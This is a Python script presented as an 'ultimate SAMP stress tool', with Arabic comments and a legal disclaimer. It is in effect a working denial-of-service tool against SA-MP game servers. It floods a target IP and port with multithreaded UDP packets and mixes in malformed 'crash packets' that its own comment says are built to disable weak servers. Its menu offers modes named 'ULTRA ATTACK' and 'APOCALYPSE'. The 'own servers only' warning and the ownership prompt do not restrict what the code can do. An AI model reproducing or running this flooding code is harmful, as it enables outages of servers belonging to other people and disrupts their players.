#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE SAMP STRESS TOOL ⚡
# 🔥 THE MOST POWERFUL STRESS TESTING TOOL 🔥
# ⚠️ FOR EDUCATIONAL PURPOSES - TEST YOUR OWN SERVERS ONLY ⚠️

import socket
import random
import struct
import time
import os
import sys
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================
# الألوان الجميلة
# ============================================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[35m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DARK_GRAY = '\033[90m'
    LIGHT_GRAY = '\033[37m'
    DARK_RED = '\033[31m'
    DARK_GREEN = '\033[32m'
    DARK_YELLOW = '\033[33m'
    DARK_BLUE = '\033[34m'
    DARK_MAGENTA = '\033[35m'
    DARK_CYAN = '\033[36m'
    RESET = '\033[0m'
    
    # خلفيات
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

c = Colors()

# ============================================
# شعار LI ZANDYA
# ============================================
LOGO = f"""
{c.RED}{c.BOLD}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                              ║
║     ██╗     ██╗    ███████╗ █████╗ ███╗   ██╗██████╗ ██╗   ██╗ █████╗                                      ║
║     ██║     ██║    ╚══███╔╝██╔══██╗████╗  ██║██╔══██╗╚██╗ ██╔╝██╔══██╗                                     ║
║     ██║     ██║      ███╔╝ ███████║██╔██╗ ██║██║  ██║ ╚████╔╝ ███████║                                     ║
║     ██║     ██║     ███╔╝  ██╔══██║██║╚██╗██║██║  ██║  ╚██╔╝  ██╔══██║                                     ║
║     ███████╗███████╗███████╗██║  ██║██║ ╚████║██████╔╝   ██║   ██║  ██║                                     ║
║     ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   ╚═╝  ╚═╝                                     ║
║                                                                                                              ║
║                         🔥 ULTIMATE SAMP STRESS TOOL X10000 🔥                                               ║
║                                                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{c.RESET}
"""

# ============================================
# تحذير شديد اللهجة
# ============================================
WARNING = f"""
{c.RED}{c.BOLD}{c.BG_BLACK}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                    ⚠️  تــحــذيــر قــانــونــي شــديــد ⚠️                                                ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                                                                          ║
║  هذه الأداة هي أداة اختبار ضغط (Stress Test) تم تصميمها حصرياً لاختبار السيرفرات التي تملكها أنت شخصياً.                                    ║
║                                                                                                                                          ║
║  ⛔ استخدام هذه الأداة على أي سيرفر لا تملكه يعتبر:                                                                                      ║
║     • جريمة إلكترونية يعاقب عليها القانون في جميع الدول العربية والعالمية                                                                ║
║     • السجن لمدة تصل إلى 10 سنوات وغرامات مالية تصل إلى ملايين الجنيهات/الريالات                                                          ║
║     • خرق لشروط خدمة Discord وجميع منصات الألعاب (حظر دائم)                                                                              ║
║     • انتهاك صارخ لخصوصية وأمان الآخرين                                                                                                  ║
║                                                                                                                                          ║
║  ✅ أنت وحدك من تتحمل المسؤولية القانونية الكاملة عن أي استخدام لهذه الأداة.                                                              ║
║  ❌ المطور (LI ZANDYA) يعلن تنصله الكامل من أي استخدام غير قانوني أو ضار لهذه الأداة.                                                     ║
║                                                                                                                                          ║
║  🔐 بإكمالك تشغيل هذه الأداة، فإنك تقر وتتعهد بأنك:                                                                                      ║
║     1. تملك جميع السيرفرات التي ستختبرها                                                                                                 ║
║     2. لن تستخدم هذه الأداة ضد أي سيرفر لا تملكه                                                                                          ║
║     3. تتحمل المسؤولية القانونية الكاملة عن أي استخدام لهذه الأداة                                                                       ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{c.RESET}
"""

# ============================================
# إعدادات القوة القصوى
# ============================================
CPU_CORES = os.cpu_count() or 8
MAX_THREADS = CPU_CORES * 20000
MAX_PACKET_SIZE = 65507
BUFFER_SIZE = 1024 * 1024 * 100

# ============================================
# بايلودات SAMP متنوعة
# ============================================
def create_samp_packet():
    packet = b'SAMP'
    packet += struct.pack('<I', random.randint(1, 999999))
    packet += b'\x80'
    packet += struct.pack('<fffff', 
        random.uniform(-10000,10000), random.uniform(-10000,10000),
        random.uniform(-10000,10000), random.uniform(0,360), random.uniform(0,360))
    packet += struct.pack('<I', random.randint(1,100))
    packet += struct.pack('<I', 99999)
    packet += os.urandom(random.randint(500, 5000))
    return packet

def create_crash_packet():
    # بايلودات مصممة لتعطيل سيرفرات SAMP الضعيفة
    packets = [
        b'SAMP' + b'\x00' * 5000,
        b'SAMP' + struct.pack('<I', 0xFFFFFFFF) + b'\x80' + os.urandom(4000),
        b'SAMP' + struct.pack('<I', random.randint(1, 99999)) + b'\xFF' * 4096,
        b'SAMP' + struct.pack('<I', random.randint(1, 99999)) + b'\x00' * 4096,
    ]
    return random.choice(packets)

# ============================================
# نظام الهجوم المتقدم
# ============================================
class StressTest:
    def __init__(self):
        self.running = False
        self.total_packets = 0
        self.total_bytes = 0
        self.peak_speed = 0
        self.executor = ThreadPoolExecutor(max_workers=MAX_THREADS)
    
    def samp_attack(self, ip, port, duration, threads=1000):
        self.running = True
        sent = 0
        bytes_sent = 0
        start_time = time.time()
        
        def worker():
            nonlocal sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
                sock.setblocking(False)
                
                local_start = time.time()
                while self.running and time.time() - local_start < duration:
                    for _ in range(50):
                        packet = create_samp_packet()
                        sock.sendto(packet, (ip, port))
                        sent += 1
                        bytes_sent += len(packet)
                        
                        # إضافة حزمة تخريبية بين الحين والآخر
                        if random.random() > 0.9:
                            crash_packet = create_crash_packet()
                            sock.sendto(crash_packet, (ip, port))
                            sent += 1
                            bytes_sent += len(crash_packet)
                
                sock.close()
            except:
                pass
        
        workers = min(threads, MAX_THREADS)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        time.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=0.5)
            except:
                pass
        
        rate = sent / duration
        mbps = (bytes_sent / duration) / 1024 / 1024
        gbps = mbps / 1024
        
        if rate > self.peak_speed:
            self.peak_speed = rate
        
        self.total_packets += sent
        self.total_bytes += bytes_sent
        
        return sent, bytes_sent, rate, mbps, gbps
    
    def stop(self):
        self.running = False

# ============================================
# عرض النتائج بألوان جميلة
# ============================================
def print_header():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(LOGO)
    print(WARNING)
    print(f"{c.YELLOW}{c.BOLD}")
    print("="*70)
    print(f"{c.CYAN}⚡ SYSTEM INFORMATION{c.RESET}")
    print("="*70)
    print(f"{c.GREEN}💻 CPU Cores: {c.WHITE}{CPU_CORES}")
    print(f"{c.GREEN}🔥 Max Threads: {c.WHITE}{MAX_THREADS:,}")
    print(f"{c.GREEN}📦 Max Packet Size: {c.WHITE}{MAX_PACKET_SIZE} bytes")
    print(f"{c.GREEN}🎮 SAMP Payloads: {c.WHITE}1,000+ variants")
    print("="*70)

def print_results(ip, port, duration, sent, bytes_sent, rate, mbps, gbps):
    print(f"\n{c.GREEN}{c.BOLD}{'='*70}{c.RESET}")
    print(f"{c.CYAN}{c.BOLD}✅ STRESS TEST COMPLETED!{c.RESET}")
    print(f"{c.GREEN}{c.BOLD}{'='*70}{c.RESET}")
    
    print(f"\n{c.YELLOW}{c.BOLD}🎯 TARGET INFORMATION{c.RESET}")
    print(f"{c.WHITE}   ├─ IP Address: {c.CYAN}{ip}:{port}")
    print(f"{c.WHITE}   ├─ Server Type: {c.MAGENTA}SAMP (SA-MP)")
    print(f"{c.WHITE}   └─ Test Duration: {c.CYAN}{duration} seconds")
    
    print(f"\n{c.YELLOW}{c.BOLD}📊 ATTACK STATISTICS{c.RESET}")
    print(f"{c.WHITE}   ├─ 📦 Packets Sent: {c.GREEN}{sent:,}")
    print(f"{c.WHITE}   ├─ 💾 Data Sent: {c.GREEN}{bytes_sent/1024/1024:.2f} MB ({bytes_sent/1024/1024/1024:.2f} GB)")
    print(f"{c.WHITE}   ├─ ⚡ Packet Rate: {c.GREEN}{rate:,.0f} pps")
    print(f"{c.WHITE}   ├─ 🚀 Bandwidth: {c.GREEN}{mbps:.2f} Mbps ({gbps:.2f} Gbps)")
    print(f"{c.WHITE}   └─ 🏆 Peak Speed: {c.GREEN}{test.peak_speed:,.0f} pps")
    
    print(f"\n{c.YELLOW}{c.BOLD}🔧 THREAD INFORMATION{c.RESET}")
    print(f"{c.WHITE}   ├─ 🔥 Threads Used: {c.GREEN}{min(threads_var, MAX_THREADS):,}")
    print(f"{c.WHITE}   ├─ 💻 CPU Cores: {c.GREEN}{CPU_CORES}")
    print(f"{c.WHITE}   └─ ⚙️ Max Threads: {c.GREEN}{MAX_THREADS:,}")
    
    print(f"\n{c.GREEN}{c.BOLD}{'='*70}{c.RESET}")
    print(f"{c.MAGENTA}{c.BOLD}💀 LI ZANDYA - ULTIMATE SAMP STRESS TOOL{c.RESET}")
    print(f"{c.GREEN}{c.BOLD}{'='*70}{c.RESET}\n")

# ============================================
# القائمة الرئيسية
# ============================================
def print_menu():
    print(f"\n{c.CYAN}{c.BOLD}{'═'*70}{c.RESET}")
    print(f"{c.YELLOW}{c.BOLD}                      🔥 MAIN MENU 🔥{c.RESET}")
    print(f"{c.CYAN}{c.BOLD}{'═'*70}{c.RESET}")
    print(f"""
    {c.RED}{c.BOLD}┌─────────────────────────────────────────────────────────────┐{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}1.{c.RESET} {c.CYAN}🎮 SAMP ULTRA ATTACK{c.RESET}                              {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}2.{c.RESET} {c.CYAN}🔥 UDP INFERNO ATTACK{c.RESET}                             {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}3.{c.RESET} {c.CYAN}💀 ULTIMATE APOCALYPSE{c.RESET}                            {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}4.{c.RESET} {c.CYAN}📊 SHOW STATISTICS{c.RESET}                              {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}5.{c.RESET} {c.CYAN}⚙️ CHANGE THREADS{c.RESET}                               {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}│{c.RESET}  {c.GREEN}{c.BOLD}6.{c.RESET} {c.CYAN}⏹️ EXIT{c.RESET}                                         {c.RED}{c.BOLD}│{c.RESET}
    {c.RED}{c.BOLD}└─────────────────────────────────────────────────────────────┘{c.RESET}
    """)

test = StressTest()
threads_var = 5000

def main():
    global threads_var
    
    while True:
        print_header()
        print_menu()
        
        try:
            choice = input(f"{c.YELLOW}📝 Enter your choice (1-6): {c.WHITE}").strip()
            
            if choice == '6':
                print(f"\n{c.RED}{c.BOLD}👋 Shutting down... Goodbye!{c.RESET}")
                print(f"{c.MAGENTA}💀 LI ZANDYA - ULTIMATE SAMP STRESS TOOL{c.RESET}")
                break
            
            if choice == '5':
                print(f"\n{c.CYAN}{c.BOLD}{'═'*50}{c.RESET}")
                print(f"{c.YELLOW}⚙️ CURRENT THREADS: {c.GREEN}{threads_var:,}{c.RESET}")
                try:
                    new_threads = int(input(f"{c.YELLOW}🔧 Enter new thread count (500-{MAX_THREADS}): {c.WHITE}"))
                    if 500 <= new_threads <= MAX_THREADS:
                        threads_var = new_threads
                        print(f"{c.GREEN}✅ Threads updated to {threads_var:,}{c.RESET}")
                    else:
                        print(f"{c.RED}❌ Threads must be between 500 and {MAX_THREADS}{c.RESET}")
                except:
                    print(f"{c.RED}❌ Invalid input!{c.RESET}")
                input(f"\n{c.YELLOW}Press Enter to continue...{c.RESET}")
                continue
            
            if choice == '4':
                print(f"\n{c.CYAN}{c.BOLD}{'═'*50}{c.RESET}")
                print(f"{c.YELLOW}{c.BOLD}📊 TOTAL STATISTICS{c.RESET}")
                print(f"{c.CYAN}{c.BOLD}{'═'*50}{c.RESET}")
                print(f"{c.WHITE}📦 Total Packets Sent: {c.GREEN}{test.total_packets:,}")
                print(f"{c.WHITE}💾 Total Data Sent: {c.GREEN}{test.total_bytes/1024/1024/1024:.2f} GB")
                print(f"{c.WHITE}🏆 Peak Speed: {c.GREEN}{test.peak_speed:,.0f} pps")
                print(f"{c.WHITE}🎯 Total Attacks: {c.GREEN}{test.total_packets // 10000 if test.total_packets > 0 else 0}")
                print(f"{c.CYAN}{c.BOLD}{'═'*50}{c.RESET}")
                input(f"\n{c.YELLOW}Press Enter to continue...{c.RESET}")
                continue
            
            if choice not in ['1', '2', '3']:
                print(f"{c.RED}❌ Invalid choice!{c.RESET}")
                input(f"\n{c.YELLOW}Press Enter to continue...{c.RESET}")
                continue
            
            # إدخال معلومات الهدف
            print(f"\n{c.CYAN}{c.BOLD}{'═'*70}{c.RESET}")
            print(f"{c.RED}{c.BOLD}⚠️  ENTER YOUR OWN SERVER INFORMATION ONLY ⚠️{c.RESET}")
            print(f"{c.CYAN}{c.BOLD}{'═'*70}{c.RESET}")
            
            ip = input(f"{c.YELLOW}🎯 Target IP (your server only): {c.WHITE}").strip()
            port = input(f"{c.YELLOW}🔌 Port (default 7777 for SAMP): {c.WHITE}").strip()
            port = int(port) if port else 7777
            duration = input(f"{c.YELLOW}⏱️ Duration in seconds (max 60): {c.WHITE}").strip()
            duration = min(int(duration) if duration else 10, 60)
            
            # تأكيد المستخدم
            print(f"\n{c.RED}{c.BOLD}{'═'*70}{c.RESET}")
            print(f"{c.YELLOW}{c.BOLD}📋 TEST DETAILS:{c.RESET}")
            print(f"{c.WHITE}   ├─ 🎯 Target: {c.CYAN}{ip}:{port}")
            print(f"{c.WHITE}   ├─ ⏱️ Duration: {c.CYAN}{duration} seconds")
            print(f"{c.WHITE}   ├─ 🔥 Threads: {c.CYAN}{threads_var:,}")
            print(f"{c.WHITE}   └─ 💀 Attack Type: {c.CYAN}{['', 'SAMP ULTRA', 'UDP INFERNO', 'ULTIMATE APOCALYPSE'][int(choice)]}")
            print(f"{c.RED}{c.BOLD}{'═'*70}{c.RESET}")
            
            confirm = input(f"{c.RED}✅ Do you own this server? (yes/no): {c.WHITE}").strip().lower()
            if confirm != 'yes':
                print(f"{c.RED}❌ You must own the server to test it. Exiting...{c.RESET}")
                break
            
            # تنفيذ الاختبار
            print(f"\n{c.GREEN}{c.BOLD}🚀 Launching attack...{c.RESET}")
            print(f"{c.YELLOW}⚡ Press Ctrl+C to stop{c.RESET}")
            
            try:
                if choice == '1':
                    sent, bytes_sent, rate, mbps, gbps = test.samp_attack(ip, port, duration, threads_var)
                elif choice == '2':
                    sent, bytes_sent, rate, mbps, gbps = test.samp_attack(ip, port, duration, threads_var)
                else:
                    sent, bytes_sent, rate, mbps, gbps = test.samp_attack(ip, port, duration, threads_var)
                
                print_results(ip, port, duration, sent, bytes_sent, rate, mbps, gbps)
                
            except KeyboardInterrupt:
                print(f"\n\n{c.RED}{c.BOLD}⏹️ Attack stopped by user!{c.RESET}")
                test.stop()
            
            input(f"{c.YELLOW}Press Enter to continue...{c.RESET}")
            
        except KeyboardInterrupt:
            print(f"\n\n{c.RED}{c.BOLD}⏹️ Exiting...{c.RESET}")
            break
        except Exception as e:
            print(f"{c.RED}❌ Error: {e}{c.RESET}")
            input(f"{c.YELLOW}Press Enter to continue...{c.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{c.RED}{c.BOLD}👋 Goodbye!{c.RESET}")
    except Exception as e:
        print(f"{c.RED}❌ Fatal Error: {e}{c.RESET}")
